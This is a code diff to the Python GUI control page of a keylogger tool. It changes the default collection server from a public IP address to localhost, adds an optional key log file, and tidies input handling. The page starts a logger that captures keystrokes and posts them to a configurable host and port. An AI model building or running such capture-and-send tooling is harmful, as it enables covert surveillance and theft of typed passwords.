@@ -29,7 +29,7 @@ class KeyloggerPage(ctk.CTkFrame):
         host_label = ctk.CTkLabel(controls, text="Server Host")
         host_label.grid(row=0, column=0, padx=10, pady=10, sticky="w")
         self.host_entry = ctk.CTkEntry(controls)
-        self.host_entry.insert(0, "109.74.200.23")
+        self.host_entry.insert(0, "127.0.0.1")
         self.host_entry.grid(row=0, column=1, sticky="ew", padx=5, pady=10)
 
         port_label = ctk.CTkLabel(controls, text="Server Port")
@@ -43,6 +43,11 @@ class KeyloggerPage(ctk.CTkFrame):
         self.interval_entry = ctk.CTkEntry(controls)
         self.interval_entry.insert(0, "10")
         self.interval_entry.grid(row=0, column=5, sticky="ew", padx=5, pady=10)
+
+        log_label = ctk.CTkLabel(controls, text="Log File (optional)")
+        log_label.grid(row=1, column=0, padx=10, pady=10, sticky="w")
+        self.log_entry = ctk.CTkEntry(controls, placeholder_text="e.g. keys.log")
+        self.log_entry.grid(row=1, column=1, columnspan=5, sticky="ew", padx=5, pady=10)
 
         button_frame = ctk.CTkFrame(self)
         button_frame.grid(row=2, column=0, pady=10)
@@ -85,9 +90,6 @@ class KeyloggerPage(ctk.CTkFrame):
 
         self.after(100, self.process_queue)
 
-    def packet_callback(self, data):
-        self.key_queue.put(data)
-
     def key_callback(self, key_data):
         self.key_queue.put(key_data)
 
@@ -105,21 +107,31 @@ class KeyloggerPage(ctk.CTkFrame):
         self.after(100, self.process_queue)
 
     def start_logger(self):
-        host = self.host_entry.get().strip()
-        port = int(self.port_entry.get().strip() or 8080)
-        interval = int(self.interval_entry.get().strip() or 10)
+        host = self.host_entry.get().strip() or "127.0.0.1"
+        try:
+            port = int(self.port_entry.get().strip() or 8080)
+        except ValueError:
+            port = 8080
+        try:
+            interval = int(self.interval_entry.get().strip() or 10)
+        except ValueError:
+            interval = 10
+
+        log_file = self.log_entry.get().strip() or None
 
         if self.keylogger is None:
             self.keylogger = KeyLogger(
                 callback=self.key_callback,
                 host=host,
                 port=port,
-                interval=interval
+                interval=interval,
+                log_file=log_file,
             )
 
         self.keylogger.host = host
         self.keylogger.port = port
         self.keylogger.interval = interval
+        self.keylogger.log_file = log_file
         self.keylogger.start()
 
         self.status_label.configure(text=f"● Capturing keys, posting to {host}:{port}")
